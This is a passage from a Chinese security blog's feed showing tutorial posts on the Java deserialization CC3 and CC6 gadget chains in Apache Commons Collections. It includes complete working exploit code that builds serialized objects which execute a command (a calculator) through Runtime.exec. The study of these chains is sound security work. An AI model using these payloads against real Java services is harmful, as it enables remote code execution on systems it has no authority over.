class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>序列化反序列化之后，成功弹计算器！</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417132429347.png" alt="image-20240417132429347"></p><h3 id="完整CC3链-不使用IvokerTransform-："><a href="#完整CC3链-不使用IvokerTransform-：" class="headerlink" title="完整CC3链(不使用IvokerTransform)："></a>完整CC3链(不使用IvokerTransform)：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3_no_InvokerTransform</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-comment">//反射修改类的属性_tfactory</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();     //第一步入口方法，newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//Map类的构建与修饰</span><br>        HashMap&lt;Object,Object&gt; inmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        inmap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outmap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(inmap,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-comment">//遍历map，触发链子</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);<br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Target.class,outmap);<br>        serialize(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过IvokerTransform的路线：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/image-20240417132709971.png" alt="image-20240417132709971"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC6链</title>
    <link href="/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/"/>
    <url>/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>CC6链其实就是URLDNS链的前半加上CC1链的后半。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png" alt="思维导图"></p><h1 id="链子构建"><a href="#链子构建" class="headerlink" title="链子构建"></a>链子构建</h1><p>入口类跟CC1链完全一致，这里不再赘述。</p><p>在找哪里调用了ChainedTransformer.transform方法时，CC1链是找到了TransformedMap类。而这里是选择了LazyMap类里的get方法。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/image-20240410110401378.png" alt="image-20240410110401378"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;             <span class="hljs-comment">//注意这里需要LazyMap的factory属性是空，这里我们后面再说。</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);           <span class="hljs-comment">//此处的factory如果是ChainedTransformer，就可以完成链子</span><br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后继续找哪里调用了get方法。</p><hr style="border: 1px solid black;"/><p>最终在TiedMapEntry类里找到了它的getValue()方法里调用了get：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> map.get(key);                    <span class="hljs-comment">//此处get如果是LazyMap，就可以完成链子</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后也是这个类的hashCode()方法里调用了它的getValue()方法，这样与前面也串联起来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();           <span class="hljs-comment">//调用getValue()方法</span><br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p>直至hashCode前面的部分在URLDNS链中有讲过，这里不再赘述。这里主要研究TiedMapEntry类。</p><hr style="border: 1px solid black;"/><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-built_in">this</span>.key = key;<br>&#125;<br></code></pre></td></tr></table></figure><p>它需要的参数很简单，一个map，这里就是我们需要传入的LazyMap，还有一个key，这里用不到可以随便传。</p><p>LazyMap里同样有decorate方法，可以修饰map。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先new一个LazyMap对象，并把ChainedTransformer传入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), chainedTransformer);<br></code></pre></td></tr></table></figure><p>然后new一个TiedMapEntry对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>接下来我们new一个HashMap对象，因为这个类是readObject入口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="问题-解决"><a href="#问题-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h1><p>那么正常来说，我们直接序列化反序列化就可以了。但是别忘了，我们在URLDNS链里也提到过，如果现在序列化，在put方法里会直接调用hash方法执行整条链子，触发payload，并修改了hashCode值，导致反序列化的时候不会触发payload。</p><p>那这里还是老方法，通过反射来修改put里的key，这里就是tiedMapEntry，而tiedMapEntry里放的LazyMap，所以我们只需要把LazyMap里的factory改成空就行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class));              <span class="hljs-comment">//在newLazyMap对象的时候，把factory属性随便写个没用的Transformer</span><br>…………<br>…………<br><span class="hljs-comment">//反射修改factory属性</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;    <span class="hljs-comment">//获取LazyMap对象的类</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);    <span class="hljs-comment">//获取LazyMap对象的类中的factory属性</span><br>factoryfield.setAccessible(<span class="hljs-literal">true</span>);     <span class="hljs-comment">//因为factory是private的变量，所以需要设置</span><br>factoryfield.set(lazymap,chainedTransformer);    <span class="hljs-comment">//设置factory值chainedTransformer</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    <span class="hljs-comment">//生成LazyMap对象并将其传给TiedMapEntry</span><br>    Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class));<br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>    HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);      <span class="hljs-comment">//在put的时候lazymap里的factory属性是空，就不会触发hash</span><br><br>    <span class="hljs-comment">//反射修改factory属性</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;    <span class="hljs-comment">//获取LazyMap对象的类</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);    <span class="hljs-comment">//获取LazyMap对象的类中的factory属性</span><br>    factoryfield.setAccessible(<span class="hljs-literal">true</span>);     <span class="hljs-comment">//因为factory是private的变量，所以需要设置</span><br>    factoryfield.set(lazymap,chainedTransformer);    <span class="hljs-comment">//设置factory值chainedTransformer</span><br><br>    serialize(map);<span class="hljs-comment">//在序列化的时候factory值又变成了chainedTransformer</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是改成这样还是不能反序列化执行命令。</p><p>还记得最开始LazyMap类里的get方法有一个if判断吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;             <span class="hljs-comment">//注意这里需要LazyMap的factory属性是空，这里我们后面再说。</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);           <span class="hljs-comment">//此处的factory如果是ChainedTransformer，就可以完成链子</span><br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里在序列化的时候，我们确确实实让LazyMap的factory属性是空了，但是，进入这个if后，执行了map.put(key, value);就会让LazyMap的factory属性不是空了。</p><p>所以，我们需要手动将LazyMap的factory属性置空，只需要在map.put(tiedMapEntry,”bbb”);后移除key即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">map.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>lazymap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure><p>至此，我们的整条CC6链写完了。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/image-20240410131412406.png" alt="image-20240410131412406"></p><h1 id="完整CC6链"><a href="#完整CC6链" class="headerlink" title="完整CC6链"></a>完整CC6链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6TEST</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//生成LazyMap对象并将其传给TiedMapEntry</span><br>        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);             <span class="hljs-comment">//在put的时候lazymap里的factory属性是空，就不会触发hash</span><br>        lazymap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);      <span class="hljs-comment">//让LazyMap的factory属性置空</span><br><br>        <span class="hljs-comment">//反射修改factory属性</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;    <span class="hljs-comment">//获取LazyMap对象的类</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);    <span class="hljs-comment">//获取LazyMap对象的类中的factory属性</span><br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);     <span class="hljs-comment">//因为factory是private的变量，所以需要设置</span><br>        factoryfield.set(lazymap,chainedTransformer);    <span class="hljs-comment">//设置factory值chainedTransformer</span><br><br>        serialize(map);         <span class="hljs-comment">//在序列化的时候factory值又变成了chainedTransformer</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span 